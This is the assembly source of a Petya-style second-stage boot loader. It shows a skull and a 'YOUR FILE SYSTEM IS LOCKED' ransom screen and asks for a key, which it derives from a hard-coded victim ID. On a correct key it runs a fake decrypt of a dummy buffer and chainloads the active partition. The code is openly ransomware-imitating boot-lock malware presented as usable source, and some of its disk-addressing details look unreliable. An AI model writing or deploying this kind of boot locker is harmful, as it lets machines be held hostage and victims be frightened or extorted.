; =========================
; stage2.asm (Petya-like + UI + chainload)
; =========================

BITS 16
ORG 0x8000

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax

    mov ax, 0x9000
    mov ss, ax
    mov sp, 0xFFFE
    sti

    call draw_screen

; =========================
; INPUT
; =========================
input_loop:
    call newline
    mov si, prompt
    call print_red

    mov di, buffer

.read:
    xor ah, ah
    int 16h
    cmp al, 13
    je .done

    mov ah, 0x0E
    mov al, '*'
    mov bl, 0x0C
    int 10h

    stosb
    jmp .read

.done:
    mov al, 0
    stosb

    call newline

    call derive_key
    call build_verifier
    call check_verifier

    cmp al, 1
    jne wrong

    mov si, success_msg
    call print_red

    call fake_decrypt_disk

    call find_active_partition
    call chainload_vbr

wrong:
    mov si, wrong_msg
    call print_red
    jmp input_loop

; =========================
; KEY DERIVATION
; =========================
derive_key:
    xor bx, bx

    mov si, victim_id
.v1:
    lodsb
    cmp al, 0
    je .pw
    add bl, al
    rol bl, 1
    jmp .v1

.pw:
    mov si, buffer
.v2:
    lodsb
    cmp al, 0
    je .done
    add bl, al
    rol bl, 1
    jmp .v2

.done:
    mov [key], bl
    ret

; =========================
; BUILD VERIFIER
; =========================
build_verifier:
    mov al, [key]
    mov cx, 16
    mov di, verifier

.loop:
    mov [di], al
    xor byte [di], 0xAA
    inc di
    loop .loop
    ret

; =========================
; CHECK
; =========================
check_verifier:
    mov si, verifier
    mov di, expected
    mov cx, 16

.loop:
    mov al, [si]
    mov bl, [di]
    cmp al, bl
    jne .fail

    inc si
    inc di
    loop .loop

    mov al, 1
    ret

.fail:
    xor al, al
    ret

; =========================
; FAKE DECRYPT
; =========================
fake_decrypt_disk:
    mov si, fake_mft
    mov cx, 512
    mov bl, [key]

.loop:
    xor byte [si], bl
    inc si
    loop .loop
    ret

; =========================
; FIND ACTIVE PARTITION
; =========================
find_active_partition:
    mov si, dap
    mov word [si+2], 1
    mov dword [si+4], mbr_buffer
    mov word [si+8], 0
    mov dword [si+10], 0

    mov ah, 42h
    mov dl, 80h
    int 13h

    mov si, mbr_buffer
    add si, 446

    mov cx, 4

.find:
    cmp byte [si], 0x80
    je .found
    add si, 16
    loop .find

    mov si, mbr_buffer
    add si, 446

.found:
    mov ax, [si+8]
    mov dx, [si+10]

    mov word [vbr_lba], ax
    mov word [vbr_lba+2], dx
    ret

; =========================
; CHAINLOAD
; =========================
chainload_vbr:
    mov si, dap

    mov word [si+2], 1
    mov dword [si+4], 0x7C00
    mov word [si+8], 0

    mov ax, [vbr_lba]
    mov dx, [vbr_lba+2]
    mov [si+10], ax
    mov [si+12], dx

    mov ah, 42h
    mov dl, 80h
    int 13h

    jmp 0x0000:0x7C00

; =========================
; UI
; =========================
draw_screen:
    call clear_screen

    mov si, skull
    call print_red

    mov si, ransom_msg
    call print_red
    ret

; =========================
; PRINT (RED)
; =========================
print_red:
.next:
    lodsb
    cmp al, 0
    je .done

    mov ah, 0x0E
    mov bl, 0x0C
    int 10h

    jmp .next
.done:
    ret

newline:
    mov ah, 0x0E
    mov al, 13
    mov bl, 0x0C
    int 10h
    mov al, 10
    int 10h
    ret

clear_screen:
    mov ax, 0x0003
    int 10h
    ret

; =========================
; DATA
; =========================
skull db 13,10
      db "             uu$$$$$$$$$$$uu",13,10
      db "          uu$$$$$$$$$$$$$$$$$uu",13,10
      db "         u$$$$$$$$$$$$$$$$$$$$$u",13,10
      db "        u$$$$$$$$$$$$$$$$$$$$$$$u",13,10
      db "       u$$$$$$$$$$$$$$$$$$$$$$$$$u",13,10
      db "       u$$$$$$*   *$$$*   *$$$$$$u",13,10
      db "       *$$$$*      u$u       $$$$*",13,10
      db "        $$$u       u$u       u$$$",13,10
      db "        $$$u      u$$$u      u$$$",13,10
      db "         *$$$$uu$$$   $$$uu$$$$*",13,10
      db "          *$$$$$$$*   *$$$$$$$*",13,10
      db "            u$$$$$$$u$$$$$$$u",13,10
      db "             u$*$*$*$*$*$*$u",13,10
      db "  uuu        $$u$ $ $ $ $u$$       uuu",13,10
      db "  u$$$$       $$$$$u$u$u$$$       u$$$$",13,10
      db "  $$$$$uu      *$$$$$$$$$*     uu$$$$$$",13,10
      db "u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$",13,10
      db "$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*",13,10
      db " ***      **$$$$$$$$$$$uu **$***",13,10
      db "          uuuu **$$$$$$$$$$uuu",13,10
      db " u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$",13,10
      db " $$$$$$$$$$****           **$$$$$$$$$$$*",13,10
      db "   *$$$$$*                      **$$$$**",13,10
      db "     $$$*                         $$$$*",13,10,13,10

ransom_msg db "========================================",13,10
           db "  YOUR FILE SYSTEM IS LOCKED",13,10
           db "========================================",13,10,13,10
           db "Data structures have been processed.",13,10
           db "A valid key is required.",13,10,13,10
           db "Enter key to continue...",13,10,0

prompt db 13,10,"Key: ",0
wrong_msg db 13,10,"Wrong key!",0
success_msg db 13,10,"Unlocked! Booting OS...",0

victim_id db "V1CTIM42",0

buffer times 32 db 0
key db 0

verifier times 16 db 0
expected times 16 db 0

fake_mft times 512 db 'A'

mbr_buffer times 512 db 0
vbr_lba dd 0

dap:
    db 16,0
    dw 0
    dd 0
    dw 0
    dq 0